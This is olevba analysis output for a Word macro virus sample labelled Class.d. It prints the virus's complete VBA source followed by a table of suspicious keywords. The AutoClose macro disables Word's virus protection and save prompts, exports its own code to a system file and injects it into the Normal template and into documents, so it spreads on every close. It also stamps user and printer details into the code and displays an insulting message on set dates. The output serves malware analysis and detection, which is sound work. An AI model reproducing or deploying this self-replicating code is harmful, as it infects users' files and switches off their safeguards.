olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-b8e3aff140682f4ff5044a22d2093239a99dcad1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-b8e3aff140682f4ff5044a22d2093239a99dcad1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'MANILA, PHILS.17.03.99 10:31:19HP LaserJet 4P on LPT1:CERTIFICATE1.doc
On Error GoTo out
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
Options.VirusProtection = False
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
Options.SaveNormalPrompt = False
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
Options.ConfirmConversions = False
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
If nt > 70 And ad > 0 Then GoTo out
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
If nt < 70 Then
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
End If
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
host.codemodule.AddFromFile ("c:\class.sys")
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
With host.codemodule
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
    For x = 1 To 4
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
    .deletelines 1
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
    Next x
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
End With
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
If nt < 70 Then
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
    With host.codemodule
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
    .replaceline 1, "Sub AutoClose()"
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
    .replaceline 91, "Sub ToolsMacro()"
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
    For x = 70 To 81
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
        .deletelines 62
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
    Next x
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
    .replaceline 35, "    For x = 1 To 4"
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
    End With
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
End If
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
With host.codemodule
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
    For x = 2 To 104 Step 2
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
    Next x
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
End With
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
out:
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
End Sub
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
Sub ToolsMacro()
'MANILA, PHILS.17.03.99 10:31:20HP LaserJet 4P on LPT1:CERTIFICATE1.doc
End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Virus.MSWord.Class.d-b8e3aff140682f4ff5044a22d2093239a99dcad1 - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Macro1()
Attribute Macro1.VB_Description = "Macro recorded 17.05.99 by MANILA, PHILS."
Attribute Macro1.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Macro1"
'
' Macro1 Macro
' Macro recorded 17.05.99 by MANILA, PHILS.
'
    CommandBars("Stop Recording").Visible = False
    ActiveWindow.Close
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

